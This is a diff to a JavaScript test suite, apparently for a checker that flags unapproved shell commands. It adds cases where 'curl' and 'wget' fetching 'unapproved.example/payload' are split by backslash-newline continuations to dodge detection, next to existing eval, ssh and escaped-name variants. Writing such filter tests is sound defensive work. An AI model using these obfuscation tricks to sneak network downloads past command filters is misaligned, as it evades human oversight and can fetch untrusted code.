@@ -823,6 +823,11 @@ describe("review regressions", () => {
     "eval 'true; curl unapproved.example/payload'",
     "ssh server 'true && curl unapproved.example/payload'",
     "ssh server 'true;wget unapproved.example/payload'",
+    ["cu", "rl unapproved.example/payload"].join(String.fromCharCode(92, 10)),
+    ["w", "get unapproved.example/payload"].join(String.fromCharCode(92, 10)),
+    ["c", "u", "rl unapproved.example/payload"].join(
+      String.fromCharCode(92, 10),
+    ),
     String.raw`c\url docs.example.com/guide`,
     String.raw`w\get docs.example.com/file`,
     String.raw`\curl docs.example.com/guide`,
